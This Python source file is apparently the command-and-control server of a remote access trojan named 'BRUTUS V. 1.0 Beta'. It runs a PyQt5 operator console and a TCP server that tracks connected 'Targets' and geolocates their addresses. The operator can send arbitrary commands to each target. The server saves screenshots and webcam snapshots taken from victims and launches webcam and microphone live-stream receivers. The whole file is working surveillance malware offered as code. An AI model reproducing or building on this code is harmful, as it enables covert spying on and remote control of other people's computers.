import asyncio
import socket
import time
import sys
import os
from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtGui import QIcon
from PyQt5.uic import loadUi
from pynput.keyboard import Key, Listener, Controller
import threading
import asyncore
import multiprocessing
import struct
import pickle
import cv2
from multiprocessing import Process
import threading
import requests
import json
from bs4 import BeautifulSoup
import locator
import Command  # import the OO-Command module



""" constants """
VERSION = "BRUTUS V. 1.0 Beta"
CURRENT_FOLDER = os.path.dirname(os.path.realpath(__file__))
HOST = socket.gethostname()
PORT = 8080

""" globals """
keyboard = Controller()
ip = ""
connections = {}
window = None
video_thread = None

# String templates and helpers to avoid inconsistent inline formatting
HEADER_TEMPLATE = "{version:<40}{ip}"
CLIENT_HEADER = "ID\t\t       Address\t\t\t   Location\n\n"
CLIENT_ROW_TEMPLATE = "{id}\t\t{addr}\t\t{location}"
IP_TEMPLATE = "Current IP: {ip}"
ERROR_CLIENT_NOT_FOUND = "[ ! ] ERROR Client not found."
UNKNOWN_COMMAND_TEMPLATE = "[ ? ] Unknown command: {command}"
CONN_CONNECT_TEMPLATE = "{time}  Target {addr!r} connected to the server."
CONN_DISCONNECT_TEMPLATE = "{time}  Target {addr!r} disconnected from the server."
CONN_LOST_TEMPLATE = "{time}  Target {addr!r} lost connection to the server."
SNAPSHOT_SAVED_TEMPLATE = "\n{time} Snapshot saved to: {path}"
SCREENSHOT_SAVED_TEMPLATE = "\n{time} Screenshot saved to: {path}"
TIME_FMT = "%H:%M:%S"

def ts():
    """Return current timestamp string according to TIME_FMT."""
    return time.strftime(TIME_FMT)



def _cmd_show_header(window):
    window.Output.clear()
    window.Input.clear()
    window.Output.addItem(HEADER_TEMPLATE.format(version=VERSION, ip=ip))

def _cmd_show_clients(window, command):
    # Build client listing using the row template
    active_connections = "\n".join(
        CLIENT_ROW_TEMPLATE.format(
            id=key,
            addr=connections[key].addr,
            location=locator.get_location(connections[key].addr[0])
        )
        for key in connections.keys()
    ) if connections else ""
    window.Output.addItem(f"{CLIENT_HEADER}{active_connections}")
    window.Input.clear()

def _cmd_echo(window, command):
    output_text = " ".join(command.split(" ")[1:])
    window.Output.addItem(output_text)
    window.Input.clear()

def _cmd_quit(window, command):
    window.hide()

def _cmd_ip(window, command):
    window.Output.addItem(IP_TEMPLATE.format(ip=ip))

def _cmd_send_at(window, command):
    try:
        receiver_id = int(command.split("@")[0])
        payload = command.split("@", 1)[1]
        receiver = connections[receiver_id]
        receiver.send(payload.encode("utf-8"))
        window.Input.clear()
    except Exception:
        window.Output.addItem(ERROR_CLIENT_NOT_FOUND)

commands = {
    "ip": _cmd_ip,
    "clear": lambda w, c=None: _cmd_show_header(w),
    "quit": _cmd_quit,
    "exit": _cmd_quit,
    "echo ": _cmd_echo,            # prefix: "echo <text>"
    "show_clients": _cmd_show_clients,
    "show clients": _cmd_show_clients,
    "sc": _cmd_show_clients,
    # '@' is handled as pattern "<id>@<cmd>"
    "@": _cmd_send_at,
}



""" PYQT5 GUI Class """‚
class MyMainWindow(QtWidgets.QMainWindow):
    
    def __init__(self):
        global ip
        super(MyMainWindow, self).__init__()
        loadUi("cmd-frontend.ui", self)
        self.setWindowTitle("Brutus")
        self.setFixedSize(690, 540)
        self.setWindowIcon(QIcon('brutus-icon.png'))

        try:
            r = requests.get('https://api.ipify.org?format=json', timeout=15)
            content = r.content
            content = content.decode("Cp1252")
            content = json.loads(content)
            ip_address = content["ip"]
            ip = ip_address
            self.Output.clear()
            self.Output.addItem(HEADER_TEMPLATE.format(version=VERSION, ip=ip))
        except Exception as e:
            print("Could not retrieve Users IP!")

    
    """ GUI method for retrieving commands """

    def get_command(self):
        global video_thread, ip

        def on_press(key):
            global video_thread

            if str(key) == "Key.enter":
                command = self.Input.text().strip()
                if not command:
                    return

                # Prepare context for command handlers
                context = {
                    "connections": connections,
                    "ip": ip,
                    "locator": locator,
                    "version": VERSION,
                }

                # Delegate to the OO-Command subsystem
                handled = Command.dispatch(command, self, context)
                if not handled:
                    self.Output.addItem(UNKNOWN_COMMAND_TEMPLATE.format(command=command))
                    self.Input.clear()

        with Listener(on_press=on_press) as listener:
            listener.join()



""" Class for handling asynchronous TCP-connections """

class ConnectionHandler(asyncore.dispatcher_with_send):

    receiving_screenshot = False
    receiving_livefeed = False
    receiving_snapshot = False

    def __init__(self, sock, window, iD):
        asyncore.dispatcher_with_send.__init__(self, sock)
        self.window = window
        self.id = iD
        self.screenshot_number = 1
        self.snapshot_number = 1
    
    def video_stream():
        os.system("python webcam-host.py")

    def audio_stream():
        os.system("python microphone-host.py")
        
    def handle_read(self):
        global video_thread

        if ConnectionHandler.receiving_snapshot:
            data = self.recv(609600)
            image_name = f"snapshot_NUM{self.snapshot_number}.png"

            if not f"webcam{self.id}" in os.listdir():
                os.mkdir(f"webcam{self.id}")

            with open(f"webcam{self.id}/{image_name}", "wb") as file:
                file.write(data)

            self.snapshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SNAPSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_snapshot = False
        
        elif ConnectionHandler.receiving_screenshot:
            data = self.recv(609600)
            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"

            if not f"screenshots{self.id}" in os.listdir():
                os.mkdir(f"screenshots{self.id}")

            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
                file.write(data)
        
            self.screenshot_number += 1
            saved_image_path = os.path.join(CURRENT_FOLDER, image_name)
            self.window.Output.addItem(SCREENSHOT_SAVED_TEMPLATE.format(time=ts(), path=saved_image_path))
            ConnectionHandler.receiving_screenshot = False
       
        else:
            data = self.recv(8096).decode("Cp1252")
            if data == "Taken Screenshot":
                ConnectionHandler.receiving_screenshot = True
            if data == "Taken Snapshot":
                ConnectionHandler.receiving_snapshot = True
            elif data == "STARTING LIVESTREAM":
                video_thread = threading.Thread(target=ConnectionHandler.video_stream)
                video_thread.start()
            elif data == "STARTING AUDIOSTREAM":
                audio_thread = threading.Thread(target=ConnectionHandler.audio_stream)
                audio_thread.start()
            elif data != "":
                self.window.Output.addItem(f"\n{ts()} {data}")

    def handle_close(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(CONN_DISCONNECT_TEMPLATE.format(time=ts(), addr=self.addr))

    def handle_expt(self):
        self.close()
        connections.pop(self.id)
        self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))




""" Asynchronous Server class """
 
class Server(asyncore.dispatcher):

    client_number = 0

    def __init__(self, host, port, window):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.window = window
        self.listen(5)

    def handle_accepted(self, sock, addr):
        self.window.Output.addItem(CONN_CONNECT_TEMPLATE.format(time=ts(), addr=addr))
        Server.client_number += 1
        connection = ConnectionHandler(sock, self.window, Server.client_number)
        connections[Server.client_number] = connection

  
def show_window():
    global window
    print("Showing window...")
    application = QtWidgets.QApplication(sys.argv)
    window = MyMainWindow()
    threading.Thread(target=window.get_command).start()
    window.show()
    sys.exit(application.exec_())


def main():
    threading.Thread(target=show_window).start()
    time.sleep(2)
    server = Server(HOST, PORT, window)
    print("Server running!")
    asyncore.loop()

if __name__ == "__main__":
    main()
